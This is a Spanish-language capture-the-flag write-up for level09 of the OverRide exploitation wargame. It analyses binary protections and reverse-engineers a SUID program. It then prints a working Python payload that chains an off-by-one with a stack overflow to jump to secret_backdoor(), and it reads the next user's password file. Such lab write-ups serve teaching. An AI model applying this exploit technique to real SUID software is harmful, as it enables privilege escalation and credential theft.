# 1. Buscar Binario:

Listamos los archivos para que muestre el biarnio del `level09` y sus permisos:

```bash
level09@OverRide:~$ ls -la
total 25
dr-xr-x---+ 1 level09 level09    80 Oct  2  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
-rw-r--r--  1 level09 level09   220 Oct  2  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Oct  2  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level09 level09  3534 Oct  2  2016 .bashrc
-rwsr-s---+ 1 end     users   12959 Oct  2  2016 level09
-rw-r--r--+ 1 level09 level09    41 Oct 19  2016 .pass
-rw-r--r--  1 level09 level09   675 Oct  2  2016 .profile
```

> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`end`).

# 2. Analizamos las protecciones de la RAM
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

### a). PIE:
```bash
level09@OverRide:~$ file ./level09 
./level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
```

## b). ASLR:
```bash
level05OverRide:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level09@OverRide:~$ readelf -l ./level09 | grep -E "RELRO|STACK"
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
  GNU_RELRO      0x0000000000001df8 0x0000000000201df8 0x0000000000201df8
```

### d). STACK CANARY:
```bash
level09@OverRide:~$ nm ./level09 
0000000000201e20 a _DYNAMIC
0000000000201fe8 a _GLOBAL_OFFSET_TABLE_
0000000000000bb8 R _IO_stdin_used
                 w _Jv_RegisterClasses
0000000000201e00 d __CTOR_END__
0000000000201df8 d __CTOR_LIST__
0000000000201e10 D __DTOR_END__
0000000000201e08 d __DTOR_LIST__
0000000000000e08 r __FRAME_END__
0000000000201e18 d __JCR_END__
0000000000201e18 d __JCR_LIST__
0000000000202048 A __bss_start
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000202038 D __data_start
0000000000000b70 t __do_global_ctors_aux
00000000000007e0 t __do_global_dtors_aux
0000000000202040 D __dso_handle
                 w __gmon_start__
0000000000201df4 d __init_array_end
0000000000201df4 d __init_array_start
0000000000000b60 T __libc_csu_fini
0000000000000ad0 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
0000000000202048 A _edata
0000000000202138 A _end
0000000000000ba8 T _fini
00000000000006f0 T _init
0000000000000790 T _start
00000000000007bc t call_gmon_start
0000000000202060 b completed.6531
0000000000202038 W data_start
0000000000202068 b dtor_idx.6533
                 U fgets@@GLIBC_2.2.5
0000000000000860 t frame_dummy
00000000000008c0 T handle_msg
0000000000000aa8 T main
                 U printf@@GLIBC_2.2.5
                 U puts@@GLIBC_2.2.5
0000000000202080 B save
000000000000088c T secret_backdoor
0000000000000932 T set_msg
00000000000009cd T set_username
                 U stdin@@GLIBC_2.2.5
                 U strncpy@@GLIBC_2.2.5
                 U system@@GLIBC_2.2.5
```

### e). `.got` y `.plt`:
```bash
level09@OverRide:~$ readelf -S ./level09 | grep -E ".got|.plt" 
  [10] .rela.plt         RELA             0000000000000648  00000648
  [12] .plt              PROGBITS         0000000000000710  00000710
  [22] .got              PROGBITS         0000000000201fb0  00001fb0
  [23] .got.plt          PROGBITS         0000000000201fe8  00001fe8
```

---

# 3. Resumen del análisis:

**IMPORTANTE**:
Estamos ante un Binario de `64 bits` tal y como nos muestra `file ./level08`

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **ON** | `shared object` | El binario carga en una dirección aleatoria en cada ejecución. |
| **NX** | **ON** | `RW` | El Stack **NO** permite ejecución. No podemos meter ni correr Shellcode allí. |
| **RELRO** | **PARTIAL** | `R` | La sección `.got.plt` sigue siendo escribible `(WA)`. |
| **CANARY** | **NO** | `ausencia` | No hay "centinela" al final del stack. Podemos desbordar el buffer y el programa NO lo detectará. |
| **.got.plt** | **WA** | `WA` | Confirma sección `.got.plt` en escritura. |

---

# 4. Fuzzing:

Al ejecutar el binario sin argumentos el programa nos recibe con un mensaje de bienvenida y nos pide que introduzcamos el usuario:

```bash
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: end
>: Welcome, end
>: Msg @Unix-Dude
>>: whoami
>: Msg sent!
level09@OverRide:~$ 
```

Probamos con el usuario `end` que y a continuación con el nuestro para ver que sucede:

```bash
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: level09
>: Welcome, level09
>: Msg @Unix-Dude
>>: /bin/sh
>: Msg sent!
level09@OverRide:~$ 

```
Probamos a desbordar el buffer por que como hemos visto en `nm` usa `fgets()` que no comprueba el número de bytes, pero lo que comprobamos es que podremos desbordar el buffer y colarnos en el siguiente `prompt` y colar `/bin/sh`:

```bash
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
>: Welcome, sssssssssssssssssssssssssssssssssssssssss>: Msg @Unix-Dude
>>: >: Msg sent!
level09@OverRide:~$ 
```

---

# 5. Reverse Engineering (Target Identification):

El comando `nm` nos muestra funciones importantes:

```bash
00000000000008c0 T handle_msg        ⟸
000000000000088c T secret_backdoor   ⟸
0000000000000932 T set_msg           ⟸
00000000000009cd T set_username      ⟸
                 U strncpy@@GLIBC_2.2.5  ⟸
                 U system@@GLIBC_2.2.5   ⟸
0000000000202080 B save              ⟸
```

* `handle_msg()`, `set_msg()`, `set_username()`: Funciones propias del binario que gestionan el flujo del programa — username, mensaje y envío.
* `secret_backdoor()`: Función propia del binario que **nunca se llama explícitamente** — contiene `system()`. Es nuestro objetivo.
* `strncpy()`: Función de copia de strings con límite — posible vector de **off-by-one** si el límite está mal calculado.
* `system()`: El binario ya importa `system()`.
* `save`: Variable global en BSS — probablemente almacena la estructura del usuario entre funciones.

**Importante:** La presencia de `secret_backdoor()` y la ausencia de **Stack Canary** apuntan a un **Stack Buffer Overflow** para sobrescribir el `RIP` y redirigir la ejecución a `secret_backdoor()`. Como PIE está ON necesitamos calcular la dirección real de `secret_backdoor()` en tiempo de ejecución sumando el offset al base address del binario.

Para ver con detalle el análisis consulta el archivo
[asm_analysis.md](https://github.com/4trastos/OverRide/blob/main/level09/Resources/README.md)
en conjunto con el programa de demostración
[source.c](https://github.com/4trastos/OverRide/blob/main/level09/source.c).

---

# 6. Solución:

Para resolver este nivel explotamos el **off-by-one** de `set_username()` para ampliar `msg->len` y poder desbordar `msg->msg` hasta sobrescribir el `RIP` de `handle_msg()` con la dirección de `secret_backdoor()`.

**Nota para el corrector:** Como **PIE está ON** las direcciones cambian en cada ejecución. Hay que obtener la dirección de `secret_backdoor()` en tu propia sesión siguiendo los pasos 1 y 2.

---

## 1. Obtener la dirección de `secret_backdoor()`:

```bash
(gdb) b main
(gdb) r
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

Anota la dirección que aparezca en tu sesión — sustituye `0x55555555488c` por ese valor en el paso 3.

---

## 2. Calcular el offset hasta el RIP:

Este offset es **fijo** independientemente de PIE:

```
msg->msg base:  rbp-0xc0
saved RIP:      rbp-0xc0 + 0xc8 = 200 bytes de offset
```

---

## 3. Construcción del payload:

* **Username:** 40 bytes de relleno + `\xff` — el off-by-one sobrescribe el primer byte de `msg->len` cambiándolo de `140` a `255`.
* **Mensaje:** 200 bytes de relleno + dirección de `secret_backdoor()`.

Sustituye `SECRET` por la dirección obtenida en el paso 1:

```bash
SECRET=0x55555555488c  # reemplaza con tu dirección
(python -c "
import struct
secret = $SECRET
username = 'A' * 40 + '\xff'
msg = 'B' * 200 + struct.pack('<Q', secret)
print username
print msg
"; cat) | ./level09
```

Cuando el programa quede en espera escribe:

```bash
cat /home/users/end/.pass
```

---

## 4. Ejecución:

```bash
level09@OverRide:~$ (python -c "
import struct
secret = 0x55555555488c  # dirección obtenida en el paso 1
username = 'A' * 40 + '\xff'
msg = 'B' * 200 + struct.pack('<Q', secret)
print username
print msg
"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

---

# 7. Conclusión:

El nivel 09 combina dos técnicas — **off-by-one** y **Stack Buffer Overflow** con **PIE activado**. El off-by-one en `set_username()` permite sobrescribir el primer byte de `msg->len` ampliando el límite de `strncpy()` en `set_msg()`.
Con ese límite ampliado podemos desbordar `msg->msg` hasta sobrescribir el `RIP` de `handle_msg()`.

Como PIE está ON las direcciones cambian en cada ejecución — necesitamos obtener la dirección de `secret_backdoor()` en tiempo de ejecución con GDB.
`secret_backdoor()` llama a `system(cmd)` con input del usuario — introduciendo `cat /home/users/end/.pass` obtenemos el password final del proyecto.

---
